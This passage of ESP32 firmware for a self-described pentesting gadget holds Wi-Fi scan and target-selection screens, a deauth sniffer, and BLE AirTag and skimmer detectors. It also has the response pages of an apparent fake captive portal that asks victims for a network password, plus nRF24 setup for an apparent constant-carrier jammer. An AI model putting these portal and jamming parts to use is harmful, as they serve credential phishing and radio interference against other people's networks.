    html += ".spinner{border:3px solid #e0e0e0;border-top:3px solid #007AFF;border-radius:50%;";
    html += "width:40px;height:40px;animation:spin 1s linear infinite;margin:20px auto;}";
    html += "@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}";
    html += ".footer{padding:15px;text-align:center;background:linear-gradient(180deg,#e8e8e8 0%,#d8d8d8 100%);";
    html += "border-radius:0 0 12px 12px;border-top:1px solid #c0c0c0;}";
    html += ".redirect-text{font-size:12px;color:#86868b;margin:0;}";
    html += "@media (max-width: 400px){h2{font-size:17px;} .success-icon{width:60px;height:60px;}";
    html += ".success-icon::after{font-size:40px;}}";
    html += "</style></head>";
    html += "<body><div class='container'>";
    html += "<div class='header'>";
    html += "<div class='success-icon'></div>";
    html += "<h2>Connection Successful!</h2>";
    html += "</div>";
    html += "<div class='content'>";
    html += "<p>You are now connected to</p>";
    html += "<p class='network-name'>\"" + selectedSSID + "\"</p>";
    html += "<div class='spinner'></div>";
    html += "</div>";
    html += "<div class='footer'>";
    html += "<p class='redirect-text'>Redirecting to network settings...</p>";
    html += "</div>";
    html += "</div></body></html>";

    webServer.send(200, "text/html", html);
    
  } else {
    // ERROR RESPONSE - Missing password
    String html = "<!DOCTYPE html><html><head>";
    html += "<meta name='viewport' content='width=device-width, initial-scale=1, maximum-scale=1'>";
    html += "<style>";
    html += "*{margin:0;padding:0;box-sizing:border-box;}";
    html += "body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;";
    html += "background:#e5e5e5;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:15px;}";
    html += ".container{background:#f0f0f0;padding:0;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.15);";
    html += "max-width:450px;width:100%;}";
    html += ".header{background:linear-gradient(180deg,#d8d8d8 0%,#c8c8c8 100%);padding:25px;border-radius:12px 12px 0 0;";
    html += "text-align:center;border-bottom:1px solid #b0b0b0;}";
    html += ".error-icon{width:80px;height:80px;margin:0 auto 15px;background:#FF3B30;border-radius:50%;";
    html += "display:flex;align-items:center;justify-content:center;box-shadow:0 2px 10px rgba(255,59,48,0.3);}";
    html += ".error-icon::after{content:'!';color:#fff;font-size:50px;font-weight:bold;}";
    html += ".content{padding:25px;text-align:center;}";
    html += "h2{margin:0 0 15px;color:#000;font-size:19px;font-weight:600;}";
    html += "p{color:#505050;margin:10px 0;font-size:14px;line-height:1.5;}";
    html += ".footer{padding:15px;text-align:center;background:linear-gradient(180deg,#e8e8e8 0%,#d8d8d8 100%);";
    html += "border-radius:0 0 12px 12px;border-top:1px solid #c0c0c0;}";
    html += ".btn{display:inline-block;padding:10px 24px;background:#007AFF;color:#fff;text-decoration:none;";
    html += "border-radius:6px;font-size:14px;font-weight:500;border:1px solid #007AFF;}";
    html += ".btn:active{background:#0051D5;}";
    html += "@media (max-width: 400px){h2{font-size:17px;} .error-icon{width:60px;height:60px;}";
    html += ".error-icon::after{font-size:40px;}}";
    html += "</style></head>";
    html += "<body><div class='container'>";
    html += "<div class='header'>";
    html += "<div class='error-icon'></div>";
    html += "<h2>Connection Failed</h2>";
    html += "</div>";
    html += "<div class='content'>";
    html += "<p>Password is required to connect to the network.</p>";
    html += "<p style='font-size:13px;color:#86868b;'>Please enter a valid password and try again.</p>";
    html += "</div>";
    html += "<div class='footer'>";
    html += "<a href='/' class='btn'>Go Back</a>";
    html += "</div>";
    html += "</div></body></html>";

    webServer.send(400, "text/html", html);
  }
}

// ==================== TERMINAL-STYLE MENU ITEM ====================
void drawMenuItem(const char* text, int index, int y, bool isHovered, bool isSelected) {
  int x = SIDE_MARGIN;
  int w = 240 - (2 * SIDE_MARGIN);
  int h = MENU_ITEM_HEIGHT;
  
  // Background (only show if hovered or selected)
  if (isSelected) {
    tft.fillRect(x, y, w, h, COLOR_SELECTED_BG);
  } else if (isHovered) {
    tft.fillRect(x, y, w, h, COLOR_HOVER_BG);
  }
  
  // Left bracket (terminal style)
  tft.setTextSize(1);
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(x + 2, y + 7);
  tft.print("[");
  
  // Index number
  tft.setTextColor(COLOR_CYAN);
  tft.printf("%d", index + 1);
  
  // Right bracket
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.print("]");
  
  // Menu text
  if (isSelected) {
    tft.setTextColor(COLOR_GREEN);  // Bright green when selected
  } else if (isHovered) {
    tft.setTextColor(COLOR_WHITE);  // White when hovered
  } else {
    tft.setTextColor(COLOR_TEXT);   // Normal grey
  }
  tft.setCursor(x + 28, y + 7);
  tft.print(text);
}

void startContinuousWiFiScan() {
  continuousWiFiScan = true;
  wifiScrollOffset = 0;
  
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  
  currentState = WIFI_SCAN;
  addToConsole("Continuous scan started");
  
  // Start async scan
  WiFi.scanNetworks(true, false, false, 300);
  
  displayContinuousWiFiScan();
}

// ==================== DISPLAY WIFI SCAN - TERMINAL STYLE ====================
void displayWiFiScanResults() {
  currentState = WIFI_SCAN;
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("wifi scan");
  
  // Status line
  tft.setTextSize(1);
  tft.setTextColor(COLOR_CYAN);
  tft.setCursor(SIDE_MARGIN, HEADER_HEIGHT + 5);
  tft.print("Scanning...");
  
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(120, HEADER_HEIGHT + 5);
  tft.printf("Found: ");
  tft.setTextColor(COLOR_GREEN);
  tft.printf("%d", networkCount);
  
  // Column headers
  int listY = HEADER_HEIGHT + 20;
  tft.drawFastHLine(0, listY - 2, 240, COLOR_DARK_GREEN);
  
  tft.setTextSize(1);
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, listY);
  tft.print("SSID");
  tft.setCursor(120, listY);
  tft.print("CH");
  tft.setCursor(145, listY);
  tft.print("PWR");
  tft.setCursor(180, listY);
  tft.print("SEC");
  
  tft.drawFastHLine(0, listY + 12, 240, COLOR_DARK_GREEN);
  listY += 15;
  
  // Display networks
  int displayCount = min(networkCount - scanDisplayOffset, MAX_DISPLAY_APS);
  
  for (int i = 0; i < displayCount; i++) {
    int idx = scanDisplayOffset + i;
    int y = listY + (i * 22);
    
    // SSID
    String displaySSID = networks[idx].ssid;
    if (displaySSID.length() == 0) displaySSID = "<hidden>";
    if (displaySSID.length() > 15) displaySSID = displaySSID.substring(0, 14) + "~";
    
    tft.setTextColor(COLOR_TEXT);
    tft.setTextSize(1);
    tft.setCursor(SIDE_MARGIN, y + 5);
    tft.print(displaySSID);
    
    // Channel
    tft.setTextColor(COLOR_CYAN);
    tft.setCursor(120, y + 5);
    tft.printf("%2d", networks[idx].channel);
    
    // Signal strength
    int rssi = networks[idx].rssi;
    uint16_t signalColor;
    if (rssi > -50) signalColor = COLOR_GREEN;
    else if (rssi > -70) signalColor = COLOR_YELLOW;
    else signalColor = COLOR_RED;
    
    tft.setTextColor(signalColor);
    tft.setCursor(145, y + 5);
    tft.printf("%3d", rssi);
    
    // Security
    tft.setTextColor(networks[idx].isEncrypted ? COLOR_RED : COLOR_GREEN);
    tft.setCursor(180, y + 5);
    tft.print(networks[idx].isEncrypted ? "WPA" : "OPEN");
  }
  
  // Back button
  int backY = 305;
  tft.drawFastHLine(0, backY - 2, 240, COLOR_GREEN);
  tft.setTextColor(COLOR_RED);
  tft.setCursor(85, backY + 3);
  tft.print("[ESC] Back");
}

void displayContinuousWiFiScan() {
  static unsigned long lastUpdate = 0;
  
  // Only update display every 500ms to reduce flicker
  if (millis() - lastUpdate < 500) return;
  lastUpdate = millis();
  
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("wifi scan");
  
  // Status line
  tft.setTextSize(1);
  tft.setTextColor(COLOR_CYAN);
  tft.setCursor(SIDE_MARGIN, HEADER_HEIGHT + 5);
  tft.print("Scanning...");
  
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(120, HEADER_HEIGHT + 5);
  tft.printf("Found: ");
  tft.setTextColor(COLOR_GREEN);
  tft.printf("%d", networkCount);
  
  // Column headers
  int listY = HEADER_HEIGHT + 20;
  tft.drawFastHLine(0, listY - 2, 240, COLOR_DARK_GREEN);
  
  tft.setTextSize(1);
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, listY);
  tft.print("SSID");
  tft.setCursor(120, listY);
  tft.print("CH");
  tft.setCursor(145, listY);
  tft.print("PWR");
  tft.setCursor(180, listY);
  tft.print("SEC");
  
  tft.drawFastHLine(0, listY + 12, 240, COLOR_DARK_GREEN);
  listY += 15;
  
  // Display networks (scrollable list)
  int displayCount = min(networkCount - wifiScrollOffset, MAX_WIFI_DISPLAY);
  
  for (int i = 0; i < displayCount; i++) {
    int idx = wifiScrollOffset + i;
    int y = listY + (i * 22);
    
    // Highlight if hovered
    if (hoveredIndex == i) {
      tft.fillRect(0, y - 2, 240, 22, COLOR_HOVER_BG);
    }
    
    // New network indicator
    if (networks[idx].isNew && (millis() - networks[idx].lastSeen) < 3000) {
      tft.setTextColor(COLOR_YELLOW);
      tft.setCursor(2, y + 5);
      tft.print("*");
    }
    
    // SSID (truncate if too long)
    String displaySSID = networks[idx].ssid;
    if (displaySSID.length() == 0) displaySSID = "<hidden>";
    if (displaySSID.length() > 15) displaySSID = displaySSID.substring(0, 14) + "~";
    
    tft.setTextColor(hoveredIndex == i ? COLOR_WHITE : COLOR_TEXT);
    tft.setTextSize(1);
    tft.setCursor(SIDE_MARGIN, y + 5);
    tft.print(displaySSID);
    
    // Channel
    tft.setTextColor(COLOR_CYAN);
    tft.setCursor(120, y + 5);
    tft.printf("%2d", networks[idx].channel);
    
    // Signal strength (color coded)
    int rssi = networks[idx].rssi;
    uint16_t signalColor;
    if (rssi > -50) signalColor = COLOR_GREEN;
    else if (rssi > -70) signalColor = COLOR_YELLOW;
    else signalColor = COLOR_RED;
    
    tft.setTextColor(signalColor);
    tft.setCursor(145, y + 5);
    tft.printf("%3d", rssi);
    
    // Security
    tft.setTextColor(networks[idx].isEncrypted ? COLOR_RED : COLOR_GREEN);
    tft.setCursor(180, y + 5);
    tft.print(networks[idx].isEncrypted ? "WPA" : "OPEN");
  }
  
  // Scroll indicator
  if (networkCount > MAX_WIFI_DISPLAY) {
    int scrollY = listY + (MAX_WIFI_DISPLAY * 22) + 5;
    tft.setTextColor(COLOR_DARK_GREEN);
    tft.setTextSize(1);
    tft.setCursor(85, scrollY);
    tft.printf("[%d-%d/%d]", 
               wifiScrollOffset + 1, 
               wifiScrollOffset + displayCount, 
               networkCount);
  }
  
  // Back button (minimal terminal style)
  int backY = 305;
  tft.drawFastHLine(0, backY - 2, 240, COLOR_GREEN);
  tft.setTextColor(COLOR_RED);
  tft.setCursor(85, backY + 3);
  tft.print("[ESC] Back");
}

// ==================== PROCESS WIFI SCAN RESULTS ====================
void processWiFiScanResults() {
  int scanStatus = WiFi.scanComplete();
  
  if (scanStatus >= 0) {
    // Process each result
    for (int i = 0; i < scanStatus; i++) {
      String ssid = WiFi.SSID(i);
      uint8_t* bssid = WiFi.BSSID(i);
      
      // Check if network already exists (by BSSID)
      bool exists = false;
      int existingIndex = -1;
      
      for (int j = 0; j < networkCount; j++) {
        bool match = true;
        for (int k = 0; k < 6; k++) {
          if (networks[j].bssid[k] != bssid[k]) {
            match = false;
            break;
          }
        }
        if (match) {
          exists = true;
          existingIndex = j;
          break;
        }
      }
      
      if (exists) {
        // Update existing network
        networks[existingIndex].rssi = WiFi.RSSI(i);
        networks[existingIndex].lastSeen = millis();
        networks[existingIndex].isNew = false;
      } else if (networkCount < 50) {
        // Add new network
        networks[networkCount].ssid = ssid;
        networks[networkCount].rssi = WiFi.RSSI(i);
        networks[networkCount].channel = WiFi.channel(i);
        memcpy(networks[networkCount].bssid, bssid, 6);
        networks[networkCount].isEncrypted = (WiFi.encryptionType(i) != WIFI_AUTH_OPEN);
        networks[networkCount].lastSeen = millis();
        networks[networkCount].isNew = true;  // Mark as new for highlighting
        
        // Get encryption type string
        switch (WiFi.encryptionType(i)) {
          case WIFI_AUTH_OPEN: networks[networkCount].encryption = "OPEN"; break;
          case WIFI_AUTH_WEP: networks[networkCount].encryption = "WEP"; break;
          case WIFI_AUTH_WPA_PSK: networks[networkCount].encryption = "WPA"; break;
          case WIFI_AUTH_WPA2_PSK: networks[networkCount].encryption = "WPA2"; break;
          case WIFI_AUTH_WPA_WPA2_PSK: networks[networkCount].encryption = "WPA/2"; break;
          default: networks[networkCount].encryption = "WPA2"; break;
        }
        
        networkCount++;
        
        Serial.printf("[+] New AP: %s (Ch %d, %d dBm)\n", 
                      ssid.c_str(), 
                      WiFi.channel(i), 
                      WiFi.RSSI(i));
      }
    }
    
    // Clean up and start next scan
    WiFi.scanDelete();
    if (continuousWiFiScan && currentState == WIFI_SCAN) {
      WiFi.scanNetworks(true, false, false, 300);
    }
  }
}

// ==================== SELECT TARGET - SCROLLABLE LIST ====================
// ==================== FIXED: drawSelectTargetMenu() - With Pagination ====================
void drawSelectTargetMenu() {
  if (networkCount == 0) {
    showMessage("No networks found!", COLOR_RED);
    delay(1000);
    currentState = WIFI_MENU;
    drawWiFiMenu();
    return;
  }
  
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("select target");
  
  // Status
  tft.setTextSize(1);
  tft.setTextColor(COLOR_CYAN);
  tft.setCursor(SIDE_MARGIN, HEADER_HEIGHT + 5);
  tft.printf("Available: ");
  tft.setTextColor(COLOR_GREEN);
  tft.printf("%d", networkCount);
  
  // Column headers
  int listY = HEADER_HEIGHT + 20;
  tft.drawFastHLine(0, listY - 2, 240, COLOR_DARK_GREEN);
  
  tft.setTextSize(1);
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, listY);
  tft.print("SSID");
  tft.setCursor(110, listY);
  tft.print("CH");
  tft.setCursor(135, listY);
  tft.print("PWR");
  tft.setCursor(170, listY);
  tft.print("SEC");
  
  tft.drawFastHLine(0, listY + 12, 240, COLOR_DARK_GREEN);
  listY += 15;
  
  // Display networks with pagination
  int displayCount = min(networkCount - wifiScrollOffset, MAX_WIFI_DISPLAY);
  
  for (int i = 0; i < displayCount; i++) {
    int idx = wifiScrollOffset + i;
    int y = listY + (i * 28);
    
    // Hover effect
    if (hoveredIndex == i) {
      tft.fillRect(0, y - 2, 240, 28, COLOR_HOVER_BG);
    }
    
    // SSID
    String displaySSID = networks[idx].ssid;
    if (displaySSID.length() == 0) displaySSID = "<hidden>";
    if (displaySSID.length() > 12) displaySSID = displaySSID.substring(0, 11) + "~";
    
    tft.setTextColor(hoveredIndex == i ? COLOR_WHITE : COLOR_TEXT);
    tft.setTextSize(1);
    tft.setCursor(SIDE_MARGIN, y + 2);
    tft.print(displaySSID);
    
    // Channel
    tft.setTextColor(COLOR_YELLOW);
    tft.setCursor(110, y + 2);
    tft.printf("%2d", networks[idx].channel);
    
    // Signal strength
    int rssi = networks[idx].rssi;
    tft.setTextColor(rssi > -50 ? COLOR_GREEN : rssi > -70 ? COLOR_YELLOW : COLOR_RED);
    tft.setCursor(135, y + 2);
    tft.printf("%3d", rssi);
    
    // Security
    tft.setTextColor(networks[idx].isEncrypted ? COLOR_RED : COLOR_GREEN);
    tft.setCursor(170, y + 2);
    tft.print(networks[idx].encryption);
    
    // BSSID on second line
    tft.setTextColor(COLOR_CYAN);
    tft.setCursor(SIDE_MARGIN, y + 12);
    tft.printf("%02X:%02X:%02X:%02X:%02X:%02X", 
               networks[idx].bssid[0], networks[idx].bssid[1], 
               networks[idx].bssid[2], networks[idx].bssid[3], 
               networks[idx].bssid[4], networks[idx].bssid[5]);
  }
  
  // Scroll indicator
  if (networkCount > MAX_WIFI_DISPLAY) {
    int scrollY = listY + (MAX_WIFI_DISPLAY * 28) + 5;
    tft.setTextColor(COLOR_DARK_GREEN);
    tft.setTextSize(1);
    tft.setCursor(85, scrollY);
    tft.printf("[%d-%d/%d]", 
               wifiScrollOffset + 1, 
               wifiScrollOffset + displayCount, 
               networkCount);
  }
  
  // Back button
  int backY = 305;
  tft.drawFastHLine(0, backY - 2, 240, COLOR_GREEN);
  tft.setTextColor(COLOR_RED);
  tft.setCursor(85, backY + 3);
  tft.print("[ESC] Back");
}

// BLE callback for AirTag and Skimmer detection
class MyAdvertisedDeviceCallbacks: public BLEAdvertisedDeviceCallbacks {
  void onResult(BLEAdvertisedDevice advertisedDevice) {
    String address = advertisedDevice.getAddress().toString().c_str();
    String name = advertisedDevice.haveName() ? advertisedDevice.getName().c_str() : "";
    int rssi = advertisedDevice.getRSSI();
    
    // AirTag detection
    if (advertisedDevice.haveServiceUUID()) {
      if (address.startsWith("ff:ff:") || name.indexOf("AirTag") >= 0) {
        detectAirTag(address, rssi);
      }
    }
    
    // Card skimmer detection patterns
    if (name.indexOf("HC-") >= 0 || name.indexOf("BTM-") >= 0 || 
        name.indexOf("MLT-BT") >= 0 || rssi > -30) {
      detectSkimmer(name, rssi);
    }
  }
};

void animateSkull() {
  // Clear previous skull
  tft.fillRect(skullX - 12, skullY - 12, 24, 24, COLOR_BG);
  
  // Update position
  skullX += skullVelX;
  skullY += skullVelY;
  
  // Bounce off edges - PORTRAIT (240x320)
  if (skullX <= 15 || skullX >= 225) skullVelX = -skullVelX;
  if (skullY <= 45 || skullY >= 305) skullVelY = -skullVelY;
  
  // Draw new skull
  tft.setTextColor(0xFFFF);  // White
  tft.setTextSize(2);
  tft.setCursor(skullX - 10, skullY - 10);
  tft.print("X_X");
}

void detectAirTag(String address, int rssi) {
  bool found = false;
  for (int i = 0; i < airTagCount; i++) {
    if (airTags[i].address == address) {
      airTags[i].lastSeen = millis();
      airTags[i].rssi = rssi;
      airTags[i].detectionCount++;
      found = true;
      break;
    }
  }
  
  if (!found && airTagCount < 20) {
    airTags[airTagCount].address = address;
    airTags[airTagCount].rssi = rssi;
    airTags[airTagCount].lastSeen = millis();
    airTags[airTagCount].detectionCount = 1;
    airTagCount++;
  }
}

void detectSkimmer(String name, int rssi) {
  if (rssi > -35 && skimmerCount < 10) {
    bool duplicate = false;
    for (int i = 0; i < skimmerCount; i++) {
      if (skimmers[i].name == name) {
        duplicate = true;
        break;
      }
    }
    if (!duplicate) {
      skimmers[skimmerCount].name = name;
      skimmers[skimmerCount].rssi = rssi;
      skimmers[skimmerCount].detected = millis();
      skimmerCount++;
    }
  }
}

// ==================== DEAUTH SNIFFER FUNCTIONS ====================

void startDeauthSniffer() {
  deauthSnifferActive = true;
  deauthEventCount = 0;
  detectedDeauths = 0;
  deauthScrollOffset = 0;
  
  WiFi.disconnect();
  WiFi.mode(WIFI_STA);
  delay(100);
  
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&wifiSnifferCallback);
  esp_wifi_set_channel(snifferChannel, WIFI_SECOND_CHAN_NONE);
  
  currentState = DEAUTH_SNIFFER_ACTIVE;
  addToConsole("Deauth sniffer started");
  
  Serial.println("[+] Deauth Sniffer Active");
  Serial.printf("    Monitoring channel %d for deauth attacks\n", snifferChannel);
  
  displayDeauthSnifferActive();
}

void stopDeauthSniffer() {
  deauthSnifferActive = false;
  esp_wifi_set_promiscuous(false);
  addToConsole("Deauth sniffer stopped");
  
  Serial.printf("[+] Deauth sniffer stopped - %d deauths detected\n", detectedDeauths);
}

void drawDeauthSnifferMenu() {
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("deauth sniffer");
  
  const char* menuItems[] = {
    "Start Sniffer",
    "Stop Sniffer",
    "Change Channel"
  };
  
  int y = HEADER_HEIGHT + 10;
  for (int i = 0; i < 3; i++) {
    drawMenuItem(menuItems[i], i, y, hoveredIndex == i, false);
    y += MENU_ITEM_HEIGHT + MENU_SPACING;
  }
  
  // Status
  y += 20;
  tft.setTextSize(1);
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.printf("Channel: ");
  tft.setTextColor(COLOR_CYAN);
  tft.printf("Ch %d", snifferChannel);
  
  y += 15;
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.printf("Status: ");
  tft.setTextColor(deauthSnifferActive ? COLOR_ORANGE : COLOR_GREEN);
  tft.printf(deauthSnifferActive ? "ACTIVE" : "STOPPED");
  
  y += 15;
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.printf("Detected: ");
  tft.setTextColor(detectedDeauths > 0 ? COLOR_RED : COLOR_GREEN);
  tft.printf("%d deauths", detectedDeauths);
  
  // Info
  y += 30;
  tft.drawFastHLine(0, y, 240, COLOR_DARK_GREEN);
  y += 10;
  
  tft.setTextSize(1);
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("Detects deauth attacks from");
  y += 12;
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("other devices on the network");
  
  // Back button
  int backY = 305;
  tft.drawFastHLine(0, backY - 2, 240, COLOR_GREEN);
  tft.setTextColor(COLOR_RED);
  tft.setCursor(85, backY + 3);
  tft.print("[ESC] Back");
}

void displayDeauthSnifferActive() {
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("deauth sniffer");
  
  // Live indicator
  static bool blink = false;
  blink = !blink;
  tft.fillCircle(220, 12, 3, blink ? COLOR_RED : COLOR_DARK_GREEN);
  
  // Stats bar - compact
  int statsY = HEADER_HEIGHT + 5;
  tft.setTextSize(1);
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN, statsY);
  tft.printf("Ch:%d", snifferChannel);
  
  tft.setTextColor(detectedDeauths > 0 ? COLOR_RED : COLOR_GREEN);
  tft.setCursor(80, statsY);
  tft.printf("Deauths:%d", detectedDeauths);
  
  // Alert if deauths detected
  if (detectedDeauths > 0) {
    tft.setTextColor(COLOR_RED);
    tft.setCursor(SIDE_MARGIN, statsY + 12);
    tft.print("! ATTACK DETECTED !");
  }
  
  // Column headers
  int listY = detectedDeauths > 0 ? HEADER_HEIGHT + 32 : HEADER_HEIGHT + 22;
  tft.drawFastHLine(0, listY - 2, 240, COLOR_DARK_GREEN);
  
  tft.setTextSize(1);
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, listY);
  tft.print("SOURCE -> TARGET");
  tft.setCursor(180, listY);
  tft.print("AGE");
  
  tft.drawFastHLine(0, listY + 12, 240, COLOR_DARK_GREEN);
  listY += 15;
  
  // Calculate pagination
  const int EVENTS_PER_PAGE = 9;
  int totalEvents = deauthEventCount;
  int totalPages = (totalEvents + EVENTS_PER_PAGE - 1) / EVENTS_PER_PAGE;
  int currentPage = deauthScrollOffset / EVENTS_PER_PAGE;
  
  if (totalEvents == 0) {
    tft.setTextSize(1);
    tft.setTextColor(COLOR_GREEN);
    tft.setCursor(SIDE_MARGIN, listY + 60);
    tft.print("No deauth attacks detected");
    tft.setCursor(SIDE_MARGIN, listY + 75);
    tft.setTextColor(COLOR_TEXT);
    tft.print("Network is clean");
  } else {
    // Display events for current page (newest first)
    int startIdx = deauthScrollOffset;
    int endIdx = min(startIdx + EVENTS_PER_PAGE, totalEvents);
    
    for (int i = 0; i < (endIdx - startIdx); i++) {
      int idx = totalEvents - 1 - startIdx - i;
      
      if (idx < 0 || idx >= totalEvents) continue;
      
      int y = listY + (i * 28);
      
      // Warning indicator
      tft.setTextColor(COLOR_RED);
      tft.setTextSize(1);
      tft.setCursor(SIDE_MARGIN, y);
      tft.print("[!]");
      
      // Source MAC (first 3 octets)
      tft.setTextColor(COLOR_ORANGE);
      tft.setCursor(SIDE_MARGIN + 20, y);
      tft.printf("%02X:%02X:%02X", 
                 deauthEvents[idx].sourceMAC[0],
                 deauthEvents[idx].sourceMAC[1],
                 deauthEvents[idx].sourceMAC[2]);
      
      // Arrow
      tft.setTextColor(COLOR_DARK_GREEN);
      tft.setCursor(SIDE_MARGIN + 70, y);
      tft.print("->");
      
      // Target MAC (first 3 octets)
      tft.setTextColor(COLOR_CYAN);
      tft.setCursor(SIDE_MARGIN + 90, y);
      tft.printf("%02X:%02X:%02X", 
                 deauthEvents[idx].targetMAC[0],
                 deauthEvents[idx].targetMAC[1],
                 deauthEvents[idx].targetMAC[2]);
      
      // Time ago
      unsigned long ago = (millis() - deauthEvents[idx].timestamp) / 1000;
      tft.setTextColor(COLOR_TEXT);
      tft.setCursor(180, y);
      if (ago < 60) {
        tft.printf("%ds", ago);
      } else {
        tft.printf("%dm", ago / 60);
      }
      
      // Details line (channel + RSSI)
      tft.setTextColor(COLOR_DARK_GREEN);
      tft.setCursor(SIDE_MARGIN + 20, y + 10);
      tft.printf("Ch%d", deauthEvents[idx].channel);
      
      tft.setTextColor(COLOR_YELLOW);
      tft.setCursor(SIDE_MARGIN + 60, y + 10);
      tft.printf("%ddBm", deauthEvents[idx].rssi);
    }
  }
  
  // ✅ FIXED: Footer with pagination - no overlap with stop button
  int footerY = 275;  // Moved up from 280 to avoid overlap
  
  if (totalPages > 1) {
    tft.drawFastHLine(0, footerY, 240, COLOR_DARK_GREEN);
    tft.setTextSize(1);
    tft.setTextColor(COLOR_CYAN);
    tft.setCursor(SIDE_MARGIN, footerY + 5);
    tft.printf("Page %d/%d", currentPage + 1, totalPages);
    
    tft.setTextColor(COLOR_TEXT);
    tft.setCursor(120, footerY + 5);
    tft.print("Tap to scroll");
  }
  
  // ✅ FIXED: Consistent stop button style
  int backY = 305;
  tft.drawFastHLine(0, backY - 2, 240, COLOR_GREEN);
  tft.setTextColor(COLOR_RED);
  tft.setCursor(75, backY + 3);
  tft.print("[TAP] Stop");
}

void handleDeauthSnifferMenuTouch(int x, int y) {
  // Back button
  if (y > 300) {
    if (deauthSnifferActive) stopDeauthSniffer();
    currentState = MORE_TOOLS_MENU;
    hoveredIndex = -1;
    drawMoreToolsMenu();
    return;
  }
  
  // Deauth sniffer is active - handle scrolling and stop
  if (currentState == DEAUTH_SNIFFER_ACTIVE) {
    int totalEvents = deauthEventCount;
    const int EVENTS_PER_PAGE = 9;
    int totalPages = (totalEvents + EVENTS_PER_PAGE - 1) / EVENTS_PER_PAGE;
    
    if (y > 300) {
      // Stop button
      stopDeauthSniffer();
      currentState = DEAUTH_SNIFFER;
      drawDeauthSnifferMenu();
    } else if (y > 280) {
      // Footer area - ignore
      return;
    } else if (totalPages > 1) {
      // Scroll through pages
      int currentPage = deauthScrollOffset / EVENTS_PER_PAGE;
      currentPage = (currentPage + 1) % totalPages;
      deauthScrollOffset = currentPage * EVENTS_PER_PAGE;
      displayDeauthSnifferActive();
    }
    return;
  }
  
  // Menu interaction
  int startY = HEADER_HEIGHT + 10;
  int buttonIndex = getTouchedButtonIndex(y, startY);
  
  if (buttonIndex < 0 || buttonIndex > 2) return;
  
  switch (buttonIndex) {
    case 0:  // Start Sniffer
      if (!deauthSnifferActive) {
        deauthScrollOffset = 0;
        startDeauthSniffer();
      }
      break;
      
    case 1:  // Stop Sniffer
      if (deauthSnifferActive) {
        stopDeauthSniffer();
        currentState = DEAUTH_SNIFFER;
        drawDeauthSnifferMenu();
      }
      break;
      
    case 2:  // Change Channel
      snifferChannel = (snifferChannel % 13) + 1;
      if (deauthSnifferActive) {
        esp_wifi_set_channel(snifferChannel, WIFI_SECOND_CHAN_NONE);
      }
      drawDeauthSnifferMenu();
      break;
  }
}

// In setup(), REPLACE the WiFi initialization section with:
void setup() {
  Serial.begin(115200);
  delay(1000);
  
  Serial.println("\n╔═══════════════════════════════════════╗");
  Serial.println("║     P4WNC4K3 PENTESTING DEVICE        ║");
  Serial.println("║         Initializing...                ║");
  Serial.println("╚═══════════════════════════════════════╝\n");
  
  // ==================== WATCHDOG TIMER ====================
  Serial.print("[*] Init Watchdog Timer... ");
  esp_task_wdt_init(30, true);
  esp_task_wdt_add(NULL);
  Serial.println("OK");
  
  // ==================== TFT DISPLAY ====================
  Serial.print("[*] Init TFT Display... ");
  tft.init();
  tft.setRotation(0);  // Portrait mode
  tft.fillScreen(COLOR_BG);
  pinMode(TFT_BL, OUTPUT);
  digitalWrite(TFT_BL, HIGH);
  Serial.println("OK");
  
  // Touch calibration
  uint16_t calData[5] = {275, 3620, 320, 3590, 4};
  tft.setTouch(calData);
  
  // ==================== WIFI INITIALIZATION ====================
  Serial.print("[*] Init WiFi subsystem... ");
  WiFi.mode(WIFI_MODE_NULL);
  delay(100);
  esp_wifi_start();
  delay(100);
  Serial.println("OK");
  
  // ==================== SPIFFS INITIALIZATION ====================
  Serial.print("[*] Init SPIFFS... ");
  if (!SPIFFS.begin(true)) {
    Serial.println("FAIL - Formatting...");
    SPIFFS.format();
    SPIFFS.begin(true);
    Serial.println("OK (formatted)");
  } else {
    Serial.println("OK");
  }
  
  // ==================== nRF24 INITIALIZATION (OPTIMIZED) ====================
  Serial.println("\n[*] Initializing nRF24L01 modules...");
  Serial.println("    Using constant carrier method (Smoochiee)");

  // Init HSPI bus with 16 MHz speed
  Serial.print("    HSPI bus (16 MHz)... ");
  hspi.begin(HSPI_SCLK, HSPI_MISO, HSPI_MOSI, -1);
  hspi.setFrequency(NRF_SPI_SPEED);  // ⬅️ CRITICAL: Set 16 MHz
  hspi.setDataMode(SPI_MODE0);
  hspi.setBitOrder(MSBFIRST);

  // Set CS and CE pins
  pinMode(NRF1_CSN_PIN, OUTPUT);
  pinMode(NRF2_CSN_PIN, OUTPUT);
  pinMode(NRF1_CE_PIN, OUTPUT);
  pinMode(NRF2_CE_PIN, OUTPUT);
  digitalWrite(NRF1_CSN_PIN, HIGH);
  digitalWrite(NRF2_CSN_PIN, HIGH);
  digitalWrite(NRF1_CE_PIN, LOW);
  digitalWrite(NRF2_CE_PIN, LOW);
  delay(100);
